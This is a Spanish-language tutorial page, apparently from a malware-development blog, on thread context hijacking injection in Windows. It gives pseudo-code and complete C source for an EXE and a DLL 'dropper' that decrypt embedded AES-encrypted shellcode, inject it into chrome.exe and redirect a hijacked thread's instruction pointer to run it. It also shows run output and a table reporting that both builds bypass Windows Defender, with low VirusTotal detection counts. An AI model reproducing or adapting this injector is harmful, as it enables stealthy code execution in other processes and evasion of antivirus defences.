---
layout: default
---

# Inyección en hilo del proceso externo

Otro mecanisomo utilizado se trata de una técnica más avanzada de la inyección de shellcode en un proceso externo.
En este caso el método tiene las siguientes estapas:
- Localizar el proceso remoto en el que tengamos privilegios de escritura y ejecución 
- Reservar memoria en la que se elojará nuestro payload en el mapa de meoria del proceso remoto
- Escribir el shellcode en el buffer de la memoria reservada
- Realizar un "hijacking" o secuestro de un hilo de ejecución del proceso remoto, modificar su contexto y hacer que apunte a la zona de memoria en la que se alojó el shellcode por el proceso molicioso.

De este modo conseguiremos que el proceso remoto mediante su hilo, realice la ejecución del payload por si mismo.
Es cierto que si la ejecución del hilo es importante para el correcto funcionamiento dle proceso, es posible que este haga crash o se cierre tras la ejecución de nuestro payload.

## Diagrama de flujo de la ejecución

![Remote process Thread Context ](/assets/images/remote_thread_context.png)

## Pseudo-codigo de la ejecución

```c
// 1.se busca el proceso externo y se obtiene el Id posteriormente se obtiene el thread que se quiere secuestrar
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID)

// 2. Se reserva el espacio de memoria asociado al shellcode en el proceso remoto
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. Se ecribe el shellcode en el buffer
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. Se suspende el hilo del proceso remoto secuestrado y se obtiene el contexto
CONTEXT ctx
ctx.ContextFlags = CONTEXT_FULL
SuspendThread(hThread)
GetThreadContext(hThread, &ctx)

// 5. Se apunta el siguiente registro a ejecutar Rip en 64 bits a la posicion de memoria en la que se encuentra nuestro shellcode
ctx.Rip = pRemoteCode      // 64-bit process

// 6. se actualiza el contexto del thread y se le permite continuar
SetThreadContext(hThread, &ctx)
ResumeThread(hThread)
```
La manipulación de los hilos de un proceso se realiza mediante el uso del objeto con la siguiente estructura: THREADENTRY32 

```c
typedef struct tagTHREADENTRY32 {
  DWORD dwSize;			// Tamaño en bytes de la estructura
  DWORD cntUsage;		// En desuso, valor simepre a 0
  DWORD th32ThreadID;		// Identificador del hilo
  DWORD th32OwnerProcessID;	// PID del proceso al que pertenece el hilo
  LONG  tpBasePri;		// Prioridad de ejecución del hilo un valor entre 1 - 32
  LONG  tpDeltaPri;		// En desuso, valor simepre a 0
  DWORD dwFlags;		// En desuso, valor simepre a 0
} THREADENTRY32, *PTHREADENTRY32;
```

## EXE Código fuente

Es Importante la función Injection en la que se puede validar como se obtiene:
- Posicion de memoria donde se encuentra el buffer almacenado
- Posición de memoria del registro Rid en el momento en el que el hilo se suspende
- Actualización del registro Rid en el contexto del hilo

```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
unsigned char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido     
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				//printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("[FindProcess]: Process Found %s :", pe32.szExeFile);
						printf(" PID %d \n", pid);
                        break;
                }
        }       
        CloseHandle(hProcSnap); //se cierra el snapshot       
        return pid; // retorno de pid
}


HANDLE FindThread(int pid){
	printf("[FindThread] for pid %d \n", pid);
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	while (Thread32Next(Snap, &thEntry)) {
		//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);
		if (thEntry.th32OwnerProcessID == pid) 	{
			printf("[FindThread] : Thread found %d :", thEntry.th32ThreadID);
			printf(" ProcessId %d \n", thEntry.th32OwnerProcessID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

int Inject(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	printf("[Inject]: Inject Context Hijacking thread Of process %d \n", pid);
	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	printf("[Inject]: Decrypt shellcode \n");
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	printf("[Inject]: Allocate memory in external process \n");
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	printf("[Inject]: Write shellcode \n");
	SuspendThread(hThread);	
	printf("[Inject]: Suspend Thread %d \n", hThread);
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
	printf("[Inject]: Get Thread COntext %s \n", &ctx);
	printf("[Inject] Thread pRemoteCodeAddress : %d \n", pRemoteCode);
	printf("[Inject] [Hijacking] Thread Rip Next execution instruction: %d \n", ctx.Rip);
	ctx.Rip = (DWORD_PTR) pRemoteCode;
	printf("[Inject] [Hijacking] Thread Rip Next execution instruction: %d \n", ctx.Rip);
	SetThreadContext(hThread, &ctx);
	printf("[Inject]: Set ThreadContext And ResumeThread wait for execution ..... \n");
	return ResumeThread(hThread);	
}


int main(void) {
	printf("[Main] Init Dropper \n");
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("chrome.exe");
	if (pid) {
		printf("[Main] Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	printf("[Main] End Dropper \n");
	return 0;
}


```

Salida de ejecución del proceso:

```
[Main] Init Dropper
[FindProcess]: Process Found chrome.exe : PID 60
[Main] chrome.exe PID = 60
[Inject]: Inject Context Hijacking thread Of process 60
[FindThread] for pid 60
[FindThread] : Thread found 1828 : ProcessId 60
[Inject]: Decrypt shellcode
[Inject]: Allocate memory in external process
[Inject]: Write shellcode
[Inject]: Suspend Thread 156
[Inject]: Get Thread COntext
[Inject] Thread pRemoteCodeAddress : 715325440
[Inject] [Hijacking] Thread Rip Next execution instruction: 242063620
[Inject] [Hijacking] Thread Rip Next execution instruction: 715325440
[Inject]: Set ThreadContext And ResumeThread wait for execution .....
[Main] End Dropper
```
![Thread Context Execution](/assets/images/thread_context_execution.png)

## DLL Código fuente

```c
#include <winternl.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


extern "C" {
	
	
int AESDecrypt(byte * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido     
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				//printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("[FindProcess]: Process Found %s :", pe32.szExeFile);
						printf(" PID %d \n", pid);
                        break;
                }
        }       
        CloseHandle(hProcSnap); //se cierra el snapshot       
        return pid; // retorno de pid
}


HANDLE FindThread(int pid){
	printf("[FindThread] for pid %d \n", pid);
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	while (Thread32Next(Snap, &thEntry)) {
		//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);
		if (thEntry.th32OwnerProcessID == pid) 	{
			printf("[FindThread] : Thread found %d :", thEntry.th32ThreadID);
			printf(" ProcessId %d \n", thEntry.th32OwnerProcessID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

int Inject(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	printf("[Inject]: Inject Context Hijacking thread Of process %d \n", pid);
	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}
	AESDecrypt((byte *) payload, payload_len, (char *) key, sizeof(key));
	printf("[Inject]: Decrypt shellcode \n");
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	printf("[Inject]: Allocate memory in external process \n");
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	printf("[Inject]: Write shellcode \n");
	SuspendThread(hThread);	
	printf("[Inject]: Suspend Thread %d \n", hThread);
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
	printf("[Inject]: Get Thread COntext %s \n", &ctx);
	printf("[Inject] Thread pRemoteCodeAddress : %d \n", pRemoteCode);
	printf("[Inject] [Hijacking] Thread Rip Next execution instruction: %d \n", ctx.Rip);
	getchar();
	ctx.Rip = (DWORD_PTR) pRemoteCode;
	printf("[Inject] [Hijacking] Thread Rip Next execution instruction: %d \n", ctx.Rip);
	SetThreadContext(hThread, &ctx);
	printf("[Inject]: Set ThreadContext And ResumeThread wait for execution ..... \n");
	return ResumeThread(hThread);	
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	printf("[Main] Init Dropper \n");
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("chrome.exe");
	if (pid) {
		printf("[Main] chrome.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	printf("[Main] End Dropper \n");
	return 0;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
Ejecución:

```
rundll32.exe ThreadContextDLL.dll,f0ns1
```

![Thread Context Dll](/assets/images/thread_context_dll.png)


## Detecciones 

| Code Type  | Windows Defender Bypass | AV Bypass | EDR Bypass |
| ------------- | ------------- | ------------- | ------------- |
| EXE inyeccion en el contexto del hilo de proceso externo cifrado AES  | True | 26/72 VT detections | False |
| DLL inyeccion en el contexto del hilo de proceso externo cifrado AES  | True | 7/71 VT detections | False |

![Thread Context Dll detections](/assets/images/Thread_context_dll_detections.png)

[back](./injection_types.html)